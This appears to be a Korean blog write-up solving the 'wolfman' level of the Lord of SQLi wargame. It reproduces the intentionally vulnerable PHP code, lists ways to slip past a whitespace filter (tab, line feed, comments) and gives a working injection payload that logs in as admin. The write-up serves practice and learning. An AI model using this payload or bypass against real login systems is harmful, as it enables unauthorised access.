---
layout: post
title: "LoS wolfman"
author: "isanghyeon"
tags: wargame
---

|문제 명|풀이 여부|URL|
|:------:|:---:|:-----:|
| **wolfman** | <span style="color:red">O</span> | https://los.rubiya.kr/chall/wolfman_4fdc56b75971e41981e3d1e2fbe9b7f7.php |

<hr/><br>

### Challenge Source Code
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/ /i', $_GET[pw])) exit("No whitespace ~_~"); 
  $query = "select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("wolfman"); 
  highlight_file(__FILE__); 
?>
```

<br>

### Analysis Source Code
- #### preg_match function for $_GET[pw]
> ```php 
> preg_match('/prob|_|\.|\(\)/i', $_GET[pw])
> ```
> ```php
> preg_match('/ /i', $_GET[pw])
> ```
- #### Solve Conditions
> ```php
> f($result['id'] == 'admin') solve("wolfman");
> ```
|query|parms1|params2|
|:--:|:--:|:--:|
|select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'|id='guest'|pw='{$_GET[pw]}'|

본 문제에서 말하는 건 whitespace에 대한 우회를 말한다.  
preg_match() 에서 ``` '/ /i' ``` 와 같이 정규표현식이 작성되어 있다.  
따라서 whitespace를 우회하기 위해 사용될 수 있는 벡터를 아래 테이블을 통해 보자.

|vector|description|
|:--:|:--:|
| tab | description |
| line feed | description |
| carrage return | description |
| comment(/**/, --%20, #) | description |
| \(, \) | description |
| + | description |

특정 query가 삽입되었을 때 반환되는 array의 'id' 인덱스의 값이 'admin'이면 solve 된다.  
whitespace를 우회하기 위헤 ``` %0a ```를 활용해보자.  

최종적인 공격 벡터는 다음과 같다.  
```sql
select id from prob_wolfman where id='guest' and pw='nop'%0a(line feed) or id='admin'#'
```

<hr/>
<br>

### Exploit Source Code
|작성 언어|Exploit Link|How to Exploit|
|:------:|:---:|:--:|
| **Python3.8** | https://github.com/isanghyeon/LordofSQLi-Solved-Exploit/tree/master/wolfman | whitespace bypass |